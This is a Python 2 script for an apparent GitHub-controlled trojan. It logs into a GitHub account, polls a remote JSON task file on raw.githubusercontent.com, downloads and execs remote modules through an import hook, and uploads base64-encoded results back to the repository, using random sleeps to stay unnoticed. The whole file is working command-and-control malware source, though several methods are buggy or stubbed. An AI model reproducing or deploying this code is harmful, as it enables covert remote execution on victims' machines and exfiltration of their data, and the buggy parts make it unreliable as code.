#!/usr/bin/env python
import sys
import json
import time
import base64
import random
import Queue
import threading
from github3 import login
from httpimp import add_remote_repo, remove_remote_repo
try:
    from urllib2 import urlopen
except ImportError:
    from urllib.request import urlopen


class Boy(object):
    _id = 'abc'
    config_url = ('https://raw.githubusercontent.com/how2how/toy/master/toy/'
                  'config/')

    def __init__(self, config):
        guser = config.pop('gu', '')
        gpass = config.pop('gp', '')
        grepo = config.pop('gr', '')
        self.base_modules = config.pop('bm', {})
        self.task_url = config.pop('tu', self.config_url)
        self.run_modules = config.pop('rm', [])
        self.cf = int(config.pop('cf', 60))
        self.task_queue = Queue.Queue()
        self.gh, self.repo, self.branch = Boy.connect(guser, gpass, grepo)
        for g in (guser, gpass, grepo):
            del g

    @staticmethod
    def connect(u, p, r, b='master'):
        gh = login(username=u, password=p)
        repo = gh.repository(u, r)
        branch = repo.branch(b)
        return gh, repo, branch

    def save_result(self, data, msg):
        remote_path = 'data/%s/%d.data' % (
            self._id, random.randint(1000, 100000))
        self.repo.create_file(remote_path, msg, base64.b64encode(data))
        return

    def load(module, url):
        add_remote_repo([module], url)
        exec "import %s" % module

    def unload(module, url):
        remove_remote_repo(url)
        if module in sys.modules:
            del module

    def install(self):
        for pkg, url in self.base_modules.items():
            try:
                add_remote_repo([pkg], url)
                # __import__(pkg)
                print 'Try to import %s' % pkg
                exec "import %s" % pkg
            except Exception:
                print 'exception with %s' % pkg
                pass
        for m in self.run_modules:
            try:
                exec "from toy.modules import %s" % m
            except Exception:
                print 'exception with %s' % m
                pass

    @staticmethod
    def get_config(self, config_url, auto_load=False):
        try:
            config = urlopen(config_url).read()
            config = json.loads(config)
            if auto_load:
                for m in config:
                    exec "from toy.modules import %s" % m['module']
        except Exception:
            config = {}
        return config

    @staticmethod
    def enc(data):
        pass

    @staticmethod
    def dec(data):
        pass

    def worker(self, m):
        self.task_queue.put(1)
        result = sys.modules[m].run()
        self.task_queue.get()
        self.save_result(result)
        return

    def run(self):
        self.install()

        while True:
            if self.task_queue.empty():
                tasks = self.get_config(
                    self.task_url + self._id + '.json', True)
                for task in tasks:
                    try:
                        # exec "from toy.modules import %s" % rm
                        t = threading.Thread(
                            target=self.worker, args=(task['module'],))
                        t.start()
                        time.sleep(random.randint(1, 10))
                    except Exception:
                        pass

            # time.sleep(random.randint(1000, 10000))
            time.sleep(self.cf)
